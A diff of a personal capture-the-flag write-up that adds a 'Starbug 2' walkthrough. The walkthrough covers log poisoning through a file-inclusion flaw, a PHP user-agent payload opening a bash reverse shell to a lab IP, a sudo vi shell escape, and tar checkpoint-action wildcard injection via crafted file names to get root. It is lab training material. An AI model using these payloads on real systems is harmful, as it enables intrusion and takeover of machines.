@@ -1,6 +1,6 @@
 Over xmas 2019, I took part in a CTF made by my university. The following are the challeneges I overcame and the things I learned whilst doing so.
 
-*This is a Red Dward themed CTF, if you don't know what that is, I highly suggest you watch it*
+*This is a Red Dwarf themed CTF, if you don't know what that is, I highly suggest you watch it*
 
 ## Science Room 1:
 The first was a login screen that I had to find a way to get around...
@@ -127,7 +127,7 @@ In the _backup.sh_ file:
 
 ![SBBAK](/SiteImages/CTFpics/Starbug1Backupfile.png)
 
-Looks like a #STAR# bug may be involved! The * means that all files are affected  and if we add file names with – at the start, as if it was an argument for the _chown_ command, could get it to drop a shell for us.
+Looks like a STAR bug may be involved! The * means that all files are affected  and if we add file names with – at the start, as if it was an argument for the _chown_ command, could get it to drop a shell for us.
 
 `–reference=RFILE` (use RFILE’s owner and group rather than specifying OWNER: GROUP values) 
 Make a test file and make a file named _–reference=test_. The test file is owned by me... therefore it will chown on all files in backups dir with my user and I will be able to read root.txt!
@@ -140,3 +140,54 @@ Use another name instead...
 
 And it worked! Get root flag.
 
+## Starbug 2:
+This one is the same website, but the same file upload method wont work this time. There are also log files in the system status menu that we can view:
+
+![SBUGLOG](/SiteImages/CTFpics/Starbug2Logs.png)
+
+The url include vulnerability is still here and it doesnt add .php to the end so a null byte isnt needed!
+
+![SBURL2](/SiteImages/CTFpics/Starbug2URL.png)
+
+We can change the user agent in the log file with a user agent spoofer to something more useful perhaps... 
+We can include the log file in the url to execute the code.
+
+Changing user agent to `<?php phpinfo(); ?>` gives us the php info page when we execute the log file via the url. 
+
+![SB2PHP](/SiteImages/CTFpics/Starbug2php.png)
+
+With this, can change user agent to something to drop a reverse shell...
+`<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.42.5/1234 0>&1'"); ?>`
+Using this as a user agent got a reverse shell dropped!
+
+Can't read _user.txt_... check `sudo -l`. Can run _vi _ command as starbug user.
+
+![SB2SUDO](/SiteImages/CTFpics/Starbug2Sudo.png)
+
+Find a way to drop a shell with vi so we can have a shell as starbug user.
+Need to upgrade to terminal first...
+
+`python -c 'import pty; pty.spawn("/bin/sh")'`
+
+`sudo -u starbug vi -c ':!/bin/sh' /dev/null`
+
+Got a shell as starbug user with this command... get _user.txt_ file.
+
+![SBSUDO2](/SiteImages/CTFpics/Starbug2Sudo2.png)
+
+Can run backup as root...
+Try run backup and see what happens.
+
+![SB2BAK](/SiteImages/CTFpics/Starbug2Backup.png)
+
+Looks like a STAR bug is involved!!
+Uses _tar_ command, can drop a priv shell with the following command...
+
+`sudo tar -cf /dev/null /dev/null --checkpoint=1 –checkpoint-action=exec=/bin/sh`
+
+make a file named _–checkpoint=1_ and another named _–checkpoint-action=exec=/bin/sh_
+Make these files in my _/home/starbug_ directory and backup to _/home/starbug_...
+execute _backup_ aaaaannnnnnddddd
+Drops root shell! Get root flag :)
+
+## Intercept: 
